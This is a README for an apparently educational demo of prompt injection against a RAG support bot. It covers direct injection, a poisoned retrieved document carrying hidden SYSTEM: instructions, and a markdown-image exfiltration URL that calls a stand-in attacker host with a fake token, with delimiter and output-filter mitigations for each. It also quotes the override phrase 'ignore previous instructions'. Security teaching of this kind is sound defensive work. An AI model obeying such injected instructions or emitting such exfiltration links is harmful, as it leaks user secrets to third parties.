# demo-2-prompt-injection

**Level:** Intermediate  
**Goal:** Show **direct** and **indirect** prompt injection plus a **markdown exfil** channel — then neutralize the same three with delimiters + output filtering.

## Objective

Demonstrate that attacks are not only “ignore previous instructions” in the chat box: retrieved documents and rendered output can also be abuse channels.

## Scenario

Acme support bot backed by a tiny RAG store (Chroma, in-memory). One document is poisoned with hidden `SYSTEM:` instructions. A separate demo induces a markdown image whose URL would exfiltrate a fake session token if a client rendered/fetched it.

## Architecture

```
                 +------------------+
  User / query |  Groq chat model |
                 +--------+---------+
                          ^
          BEFORE: raw context / no output filter
          AFTER:  <UNTRUSTED_DOCUMENT> + strip URLs/images/secrets
                          |
                 +--------+---------+
                 | Chroma (memory)  |
                 | local embeddings |
                 | all-MiniLM-L6-v2 |
                 +------------------+
                   clean docs + POISON doc
```

**Groq:** chat only. **Embeddings:** local via chromadb default (no embeddings API).

## Folder structure

```
demo-2-prompt-injection/
  llm.py
  seed_docs.py          # clean + poisoned docs, wrap_untrusted, filter_output
  attacks.md
  before/{direct,indirect,exfil}.py
  after/{direct,indirect,exfil}.py
  requirements.txt
  .env.example
  README.md
```

## Install

```bash
cd ai-security-demos/demo-2-prompt-injection
python -m venv .venv
# Windows: .venv\Scripts\activate
pip install -r requirements.txt
cp .env.example .env   # set GROQ_API_KEY
```

First Chroma run may download `all-MiniLM-L6-v2` (~80MB) once.

## Run

From `demo-2-prompt-injection/`:

```bash
# Direct
python before/direct.py
python after/direct.py

# Indirect (poisoned retrieval)
python before/indirect.py
python after/indirect.py

# Exfil markdown (inspect string only — do not fetch URL)
python before/exfil.py
python after/exfil.py
```

## Attack prompts

See [`attacks.md`](attacks.md).

## Expected output — BEFORE vs AFTER

| Attack | BEFORE | AFTER |
|---|---|---|
| Direct | `[BEFORE] secret leaked: FAKE-DIRECT-42` / `attack SUCCEEDED` | `[AFTER] blocked injection` / `attack BLOCKED` |
| Indirect | key or attacker URL in answer / `SUCCEEDED` | delimited + filter / `BLOCKED` |
| Exfil | `![](https://attacker.example.com/log?d=FAKE-EXFIL-99)` / `SUCCEEDED` | images/URLs stripped, secret redacted / `BLOCKED` |

## Explanation

1. **Direct** — user message treated as higher-priority instructions than the app system prompt.
2. **Indirect** — untrusted *retrieved* text contains instructions; the model may obey them (confused deputy).
3. **Exfil** — if a UI renders markdown images, the browser/client GET would leak secrets to a third party. This demo **only prints the string**; it never resolves the URL.

### Important: mitigable, not solved

Indirect injection is **mitigable, not solved**. Delimiters, “treat as data” prompts, and output filters raise the bar but determined content (encoding, novel phrasing, multilingual instructions, multi-hop retrieval) can still bypass models. Production needs layered controls, allowlists, and human review for high-impact actions.

## Production notes

- Never put real API keys in prompts or logs; use server-side auth.
- Sanitize/disable auto-loading of markdown images and untrusted links in chat UIs.
- Prefer citation-style RAG with strict “documents are data” framing + output DLP.
- Attacker host `attacker.example.com` is fictional — do not DNS/HTTP probe it in class.
